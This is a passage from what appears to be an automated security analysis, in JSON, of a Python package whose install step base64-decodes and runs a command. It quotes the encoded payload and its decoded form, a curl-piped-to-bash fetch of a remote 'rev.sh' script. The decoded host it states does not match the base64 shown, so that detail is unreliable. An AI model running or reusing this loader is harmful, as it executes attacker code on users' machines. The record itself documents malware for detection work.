{
  "purpose": "The code sets up a Python package with custom installation and development commands, and executes a base64-decoded command during installation.",
  "sources": "The function b64d() reads a base64-encoded string; notmalfunc() calls os.system() with decoded code.",
  "sinks": "os.system() executes the decoded command, which could be malicious if the decoded content is harmful.",
  "flows": "b64d() decodes base64 string -> notmalfunc() calls os.system() with decoded string.",
  "anomalies": "Use of base64 decoding combined with os.system() to execute dynamically decoded code is suspicious; the base64 string points to an external URL, potentially a malicious payload.",
  "analysis": "The code defines functions to decode base64-encoded commands and executes one such command during package installation. The encoded string 'Y3VybCAgLXMgaHR0cDovLzE5Mi4xNjguMS4zNDo4MDAwL3Jldi5zaCB8IGJhc2gK' decodes to 'curl -s http://192.168.1.3:8000/rev.sh | bash', which is an external script execution command. This is a common method for executing remote malicious code at install time, indicating potential malicious intent or supply chain attack vector. No other suspicious code or backdoors are evident outside this.",
  "conclusion": "The package includes code that decodes and executes a remote script during installation, which is highly suspicious and indicative of malicious behavior or a supply chain attack. The code's intent appears to be to run arbitrary code fetched from an external source during package setup.",
